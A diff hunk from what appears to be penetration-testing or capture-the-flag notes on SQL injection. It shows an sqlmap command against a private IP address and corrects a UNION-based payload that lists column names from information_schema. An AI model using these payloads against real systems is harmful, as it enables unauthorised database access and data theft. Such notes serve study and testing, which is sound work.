@@ -64,7 +64,7 @@ sqlmap -u http://172.17.1.94 --forms --dbms=MySQL
 ## Column Names
 
 ```sql
-...union select 1, table_name, column,name 3,4,5,6,7,8,9 from INFORMATION_SCHEMA.columns where table_name = '<TABLE_NAME>'
+..union select 1, column_name, 2,3,4,5,6,7,8,9 from information_schema.columns where table_schema='<DATABASE>' and table_name = '<TABLE_NAME>'
 ```
 
 ## User defined Tables/Columns
